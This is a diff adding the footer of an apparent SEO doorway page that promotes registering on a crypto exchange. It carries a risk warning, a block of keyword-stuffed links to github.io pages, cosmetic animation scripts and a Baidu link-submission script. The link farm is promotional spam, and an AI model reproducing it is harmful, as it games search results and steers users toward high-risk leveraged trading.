+        <div class="risk-warning">
+            [WARNING] 易欧注册虚拟货币合约交易涉及高风险，125倍杠杆可能导致本金全部损失。
+            比特币、以太坊价格波动剧烈，请充分了解合约交易机制后谨慎参与。
+            本页面仅供技术展示，不构成投资建议。
+        </div>
+
+        <div class="copyright">
+            <p>© 2026 易欧注册</p>
+            <p style="margin-top: 10px;">TERMINAL_ID: 0xFF00 // BLOCK_HEIGHT: 884,239</p>
+        </div>
+            <div class="footer_bottom">
+            <p class="muted">
+                <a href="/">易欧注册</a>
+                <a href="https://arroyodeborah206.github.io/" target="_blank">炒币是多少人亏钱</a><a href="https://hallanthony531.github.io/" target="_blank">安币是正规平台吗</a><a href="https://hawkinsalexandra999.github.io/" target="_blank">usdt-trc20钱包官方下载</a><a href="https://branchpatrick342.github.io/" target="_blank">u币交易所平台</a>                            </p>
+        </div></footer>
+
+    <script>
+        // 随机故障效果
+        setInterval(() => {
+            const glitchTexts = document.querySelectorAll('.glitch-text');
+            const randomText = glitchTexts[Math.floor(Math.random() * glitchTexts.length)];
+            randomText.style.animation = 'none';
+            setTimeout(() => {
+                randomText.style.animation = '';
+            }, 100);
+        }, 5000);
+
+        // 终端数据动态更新
+        function updateTerminal() {
+            const values = document.querySelectorAll('.terminal-value');
+            values.forEach(val => {
+                if (Math.random() > 0.7) {
+                    val.style.opacity = '0.5';
+                    setTimeout(() => {
+                        val.style.opacity = '1';
+                    }, 100);
+                }
+            });
+        }
+        setInterval(updateTerminal, 2000);
+
+        // 鼠标跟随视差
+        document.addEventListener('mousemove', (e) => {
+            const shapes = document.querySelectorAll('.shape');
+            const x = e.clientX / window.innerWidth;
+            const y = e.clientY / window.innerHeight;
+            
+            shapes.forEach((shape, index) => {
+                const speed = (index + 1) * 20;
+                shape.style.transform = `translate(${x * speed}px, ${y * speed}px) rotate(${index * 45}deg)`;
+            });
+        });
+    </script>
+    <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; }
+            else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script></body>
+</html>
